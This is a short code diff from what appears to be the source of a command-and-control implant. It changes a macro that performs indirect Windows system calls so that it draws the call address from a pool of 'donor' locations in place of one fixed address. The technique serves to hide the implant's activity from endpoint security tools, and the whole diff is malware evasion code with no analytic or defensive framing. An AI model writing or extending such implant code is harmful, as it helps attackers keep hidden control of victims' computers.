@@ -10,9 +10,9 @@
 #endif
 
 #define SYSCALL_INVOKE( SYS_NAME, ... )                                                                      \
-    if ( Instance->Config.Implant.SysIndirect && Instance->Syscall.SysAddress && Instance->Syscall.SYS_NAME ) { \
+    if ( Instance->Config.Implant.SysIndirect && Instance->Syscall.SysDonorCount > 0 && Instance->Syscall.SYS_NAME ) { \
         SysConfig.Ssn = Instance->Syscall.SYS_NAME;                                                           \
-        SysConfig.Adr = Instance->Syscall.SysAddress;                                                         \
+        SysConfig.Adr = SysGetDonorAddress();                                                                 \
         SysSetConfig( &SysConfig );                                                                          \
         NtStatus = SysInvoke( __VA_ARGS__ );                                                                 \
     } else {                                                                                                 \
